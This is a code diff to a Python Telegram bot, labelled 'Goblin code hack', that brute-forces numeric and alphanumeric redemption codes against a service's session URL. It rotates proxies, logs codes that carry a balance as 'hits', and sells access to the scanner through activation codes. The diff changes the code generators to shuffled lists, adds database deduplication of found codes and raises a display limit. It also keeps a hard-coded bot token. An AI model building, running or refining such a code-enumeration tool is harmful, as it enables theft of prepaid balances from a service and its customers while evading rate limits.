@@ -31,11 +31,7 @@ TOKEN = "8631397862:AAHJn7iBZ-iqVy9ZhGavdjvRgzkWFzNwlNY"
 
 # Proxy List
 PROXY_LIST = [
-    "socks5://47.238.236.151:5555",
-    "socks5://202.79.27.12:1080",
-    "socks5://118.179.93.216:9090",
-    "http://195.114.209.50:80",
-    "http://47.91.104.88:3128"
+    # "http://123.45.67.89:8080",
 ]
 proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
 
@@ -45,10 +41,10 @@ conn.execute('PRAGMA journal_mode=WAL;')
 cursor = conn.cursor()
 db_lock = asyncio.Lock()
 
-cursor.execute('CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)')
-cursor.execute('CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)')
-cursor.execute('CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)')
-cursor.execute('CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)')
+cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_url TEXT)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS found_codes_db (user_id INTEGER, code TEXT, plan TEXT, time_val TEXT)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS access_codes (code TEXT PRIMARY KEY, duration_type TEXT, is_used INTEGER DEFAULT 0, used_by INTEGER DEFAULT 0)''')
+cursor.execute('''CREATE TABLE IF NOT EXISTS authorized_users (user_id INTEGER PRIMARY KEY, duration_type TEXT, expiry_time REAL)''')
 conn.commit()
 
 # ── OCR SETUP ─────────────────────────────────────────────────────────────
@@ -151,28 +147,25 @@ async def get_balance_info(session_id):
 
 def code_generator(mode):
     if mode == "6":
-        for i in range(1000000):
-            yield str(i).zfill(6)
+        codes = [str(i).zfill(6) for i in range(1000000)]
     elif mode == "7":
-        for i in range(10000000):
-            yield str(i).zfill(7)
+        codes = [str(i).zfill(7) for i in range(10000000)]
     elif mode == "8":
-        for i in range(100000000):
-            yield str(i).zfill(8)
+        codes = [str(i).zfill(8) for i in range(10000000)]
     elif mode == "9":
-        for i in range(1000000000):
-            yield str(i).zfill(9)
+        codes = [str(i).zfill(9) for i in range(10000000)]
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        for code in itertools.product(chars, repeat=6):
-            yield ''.join(code)
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(10000000)]
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        for code in itertools.product(chars, repeat=6):
-            yield ''.join(code)
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(30000000)]
     else:
-        for i in range(1000000):
-            yield str(i).zfill(6)
+        codes = [str(i).zfill(6) for i in range(30000000)]
+
+    random.shuffle(codes)
+    for code in codes:
+        yield code
 
 async def perform_check_silent(code, chat_obj, session_url, connector, context_data):
     if context_data.get('scan_stop', False): return None
@@ -209,20 +202,20 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
                             balance_display, plan_name = balance_info
-                            if not any(item['code'] == code for item in context_data['success_codes']):
-                                context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
-                                context_data['hits'] += 1
+                            user_id = chat_obj.id
+                            
+                            async with db_lock:
+                                # အရင်က စစ်ပြီးသား (Database ထဲရှိပြီးသား) ကုဒ်ဟုတ်မဟုတ် စစ်ဆေးခြင်း
+                                cursor.execute("SELECT COUNT(*) FROM found_codes_db WHERE code = ? AND user_id = ?", (code, user_id))
+                                exists_count = cursor.fetchone()[0]
 
-                                user_id = chat_obj.id
-                                async with db_lock:
+                                if exists_count == 0:
                                     cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
                                     conn.commit()
 
-                                short_msg = f"🎉 `{code}` | {balance_display}"
-                                try:
-                                    await chat_obj.send_message(short_msg, parse_mode="Markdown")
-                                except:
-                                    pass
+                                    if not any(item['code'] == code for item in context_data['success_codes']):
+                                        context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
+                                        context_data['hits'] += 1
                             return True
                     context_data['expired'] += 1; return None
         except:
@@ -267,6 +260,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             await asyncio.sleep(0.01)
             if context.user_data.get('scan_stop', False): break
 
+            # Telegram Rate Limit မမိစေရန် ၁ စက္ကန့်မှ တစ်ကြိမ်သာ edit_text လုပ်မည်
             current_time = time.time()
             if current_time - last_edit_time < 1.0:
                 continue
@@ -292,7 +286,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             text = (
                 f"𝐆𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
                 f"{session_url}\n"
-                f" **Scanner Running** \n"
+                f" **Scanner Running**\n"
                 f" Tried: {checked_total:,}\n"
                 f" Current Code: {current_code}\n"
                 f" Hits: {hits}\n"
@@ -319,6 +313,8 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
         except:
             pass
+
+# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -495,7 +491,8 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 50", (user_id,))
+    # Saved Codes တွေကို အများဆုံး ၂၅၀ အထိ မြင်ရအောင် LIMIT 250 သို့ ပြောင်းထားပါသည်
+    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 250", (user_id,))
     rows = cursor.fetchall()
 
     if not rows:
@@ -566,6 +563,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         asyncio.create_task(run_scanner_background(query, session_url, mode, total_codes_count, context))
 
+# ── MAIN FUNCTION ─────────────────────────────────────────────────────────
 def main():
     app = Application.builder().token(TOKEN).build()
 
